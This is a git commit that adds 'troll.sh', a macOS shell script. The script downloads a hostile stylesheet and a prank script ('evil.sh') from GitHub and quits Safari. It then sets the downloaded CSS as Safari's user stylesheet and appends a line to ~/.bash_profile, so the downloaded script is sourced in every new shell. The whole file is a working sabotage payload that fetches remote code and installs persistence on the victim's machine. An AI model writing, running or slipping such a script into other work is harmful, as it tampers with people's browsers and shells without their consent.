c2bfe4c6117ec2a2e17e685bf8541c96b279b5e0
Johnny Wang <johnny-y-wang@users.noreply.github.com>
2017-02-15 11:35:50 -0800

    Create troll.sh

---
+++ troll.sh
@@ -0,0 +1,19 @@
+#!/bin/sh
+
+base="$HOME/Library/Application Support/Safari"
+file="$base/SafariSecurity.css"
+evilsh="~/KernelSupport.sh"
+
+mkdir -p "$base"
+curl -L 'https://github.com/tlrobinson/evil.css/raw/master/evil.css' > "$file"
+curl -L 'https://github.com/mathiasbynens/evil.sh/raw/master/evil.sh' > "$evilsh"
+
+osascript -e 'tell application "Safari"' -e 'quit' -e 'end tell'
+sleep 1
+
+defaults write "com.apple.Safari" "WebKitUserStyleSheetLocationPreferenceKey" "$file"
+defaults write "com.apple.Safari" "WebKitUserStyleSheetEnabledPreferenceKey" "1"
+
+clear
+
+echo 'source $evilsh' >>~/.bash_profile
